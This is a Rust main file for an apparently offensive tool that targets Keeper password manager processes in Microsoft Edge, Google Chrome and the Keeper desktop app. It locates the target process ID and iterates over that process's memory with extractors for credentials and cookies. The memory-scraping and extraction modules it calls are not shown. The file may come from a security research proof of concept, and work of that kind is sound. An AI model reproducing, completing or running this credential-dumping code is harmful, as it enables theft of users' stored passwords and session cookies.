use cli::{get_choice, Application};

fn main() -> std::io::Result<()> {
    // The explicit type annotation has been removed. The compiler will now infer
    // the correct type for `process_id` from the function returning it.
    let (process_id, extractors) = match get_choice() {
        Application::Msedge => {
            println!("[i] Scanning Microsoft Edge...");
            println!("[i] Getting target PID");
            let pid = enumerate::get_program_pid("msedge.exe", Some(r"--type=renderer --extension-process"));
            let extractors: &[fn(&str)] = &[extract::extract_credentials_chrome];
            (pid, extractors)
        }
        Application::Chrome => {
            println!("[i] Scanning Google Chrome...");
            println!("[i] Getting target PID");
            let pid = enumerate::get_program_pid("chrome.exe", Some(r"--type=renderer --extension-process"));
            let extractors: &[fn(&str)] = &[extract::extract_credentials_chrome];
            (pid, extractors)
        }
        Application::Desktop => {
            println!("[i] Scanning on the Desktop...");
            println!("[i] Getting target PID");
            let pid = enumerate::get_program_pid("keeperpasswordmanager.exe", Some(r"--renderer-client-id=4"));
            let extractors: &[fn(&str)] = &[
                extract::extract_credentials_chrome,
                extract::extract_cookies,
            ];
            (pid, extractors)
        }
    };

    if let Some(pid) = process_id {
        println!("[+] Keeper target PID Found: {}", pid);
        println!("[i] Iterating over memory");
        let _ = dump::iterate_over_mem(pid.as_u32(), extractors);
    } else {
        println!("[-] Could not find target PID");
    }

    Ok(())
}
